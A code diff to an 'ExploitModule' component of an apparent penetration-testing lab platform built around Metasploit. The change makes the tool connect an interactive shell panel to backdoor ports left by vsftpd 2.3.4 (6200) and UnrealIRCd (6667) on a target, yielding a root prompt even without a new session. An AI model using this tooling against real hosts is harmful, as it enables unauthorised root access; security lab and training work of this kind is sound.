@@ -6631,16 +6631,16 @@ function ExploitModule({token, onRunningChange}) {
         }
 
         // ─── Phase 5: Connect SHELL terminal to the backdoor port ─────
-        // For vsftpd 2.3.4 the exploit OPENS a passwordless root shell on
-        // port 6200 of the target — we can connect directly with TCP and
-        // expose it through the SHELL panel for an interactive demo. Same
-        // pattern for distccd (it spawns whatever payload we run; cmd shells
-        // call back to LHOST:LPORT which is already handled by MSF).
+        // For modules that leave a known shell-port behind (vsftpd 2.3.4 →
+        // 6200, unreal_ircd → 6667), always try to attach the SHELL panel
+        // there. We do this REGARDLESS of whether MSF reported a fresh
+        // session opened — if the box was previously exploited the shell
+        // is still listening on that port, so connecting still gives the
+        // user an interactive root prompt and proves the platform works.
         const moduleLower = (msfModule||"").toLowerCase();
         let backdoorPort = null;
         if (moduleLower.includes("vsftpd_234"))             backdoorPort = 6200;
-        else if (moduleLower.includes("unreal_ircd_3281"))   backdoorPort = 6667; // backdoor on same port
-        // (samba/distcc use reverse shells, handled by MSF handler — skip)
+        else if (moduleLower.includes("unreal_ircd_3281"))   backdoorPort = 6667;
         if (backdoorPort) {
           log(`🔌 Phase 5: Connecting shell to ${targetIP}:${backdoorPort}...`);
           try {
@@ -6649,9 +6649,10 @@ function ExploitModule({token, onRunningChange}) {
               setShellLid(rc.lid);
               setShellStatus("connected");
               startShellPoll(rc.lid);
-              log(`✅ Phase 5: Shell connected — type commands below`);
+              setTab("log");   // make sure the shell panel under the log is visible
+              log(`✅ Phase 5: Shell connected — scroll down to SHELL panel and type commands`);
             } else {
-              log(`⚠ Phase 5: Could not connect to backdoor — ${rc.error||"unknown"}`);
+              log(`⚠ Phase 5: Could not connect to backdoor — ${rc.error||"unknown"}. Try restarting the lab container.`);
             }
           } catch(e) { log(`⚠ Phase 5: ${e.message}`); }
         }
